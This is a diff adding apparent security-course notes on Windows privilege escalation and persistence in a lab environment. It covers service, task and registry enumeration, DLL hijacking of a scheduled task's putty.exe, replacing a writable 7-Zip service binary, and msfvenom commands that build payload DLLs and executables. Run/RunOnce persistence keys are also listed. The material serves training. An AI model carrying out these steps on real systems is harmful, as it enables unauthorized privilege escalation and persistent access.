@@ -489,13 +489,54 @@ rsyslog is a remote logging system
 #############################################
 Privilege Escalation :: Maintaining Persistence :: Covering Tracks - Windows
 #############################################
-
-
-
-
-
-
-
+DLLs
+  HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
+  The directory the Application was run from
+  The current directory
+UAC Settings
+  reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+AutoElevate Executables
+  sigcheck -m C:\<PATHWAY TO FILE>      # sigcheck is a sysinternals tool
+    looking for reqestedExecutionLevel    # Under Security
+Scheduled Tasks and DLL Injection
+  schtasks /query /fo LIST /v
+  schtasks /query /fo LIST /v | Select-String -Pattern "Task To Run" -CaseSensitive -Context 0,6 | Select-String -Pattern "COM handler" -NotMatch    
+  # "Task To Run" can also be changed to "Run As User"
+  Idnetify vulnerable task
+    C:\Users\student\exercise_2\putty.exe
+  Identify information we can use for research on a vulnerability
+    sigcheck c:\users\student\exercise_2\putty.exe
+  Check if you can write to directory
+    icacls "c:\users\student\exercise_2"
+  Procmon
+    run executable to find dlls it uses and where they are located
+    Ctrl + L
+      add filters
+        Process Name contains <name of executable>
+          putty.exe
+        Path contains <.dll>
+        Result contains NAME NOT FOUND
+     choose a dll that is in the same directory as the executbale
+  Go To LINOPS Machine
+    msfvenom -p windows/exec CMD='cmd.exe /C whoami > C:\\whoami.txt' -f dll > <name of dll>.dll   # the name of dll for this purpose is SSPICLI.dll
+  SCP the dll from linops to the machine
+    scp student@10.50.2.28:/home/student/Security/Day7/SSPICLI.dll C:\users\student\exercise_2    # from where your created on the linops machine to the directory in which the executable is in
+Vulnerable Services
+  Type Services (In the search bar) 
+    sort by Description   # if they don't have the description than they are probably what you are looking for
+  reg query HKLM\SYSTEM\CurrentControlSet\Services\ /s /v ImagePath | Select-String -Pattern "ImagePath" -CaseSensitive | Select-String -Pattern "system32" -NotMatch   # Powershell Command
+  Identify Vulnerable Services
+    7z.exe
+  Test Path
+    icacls "C:\Program Files\7-Zip\"
+  On LINOPS
+    msfvenom -p windows/exec CMD='cmd.exe /C whoami > C:\\whoami.txt' -f exe > 7z.exe
+  Move the document to windows
+    scp student@10.50.2.28:/home/student/Security/Day7/evil.exe "C:\Program Files\7-Zip\7z.exe"
+Common Places to look for Persistence
+  HKLM\Software\Microsoft\Windows\CurrentVersion\Run or RunOnce
+  HKCU\Software\Microsoft\Windows\CurrentVersion\Run or RunOnce
+  Scheduled Tasks and Services
 #############################################
 Privilege Escalation Activities :: Maintaining Persistence Activities :: Covering Tracks - Linux
 #############################################
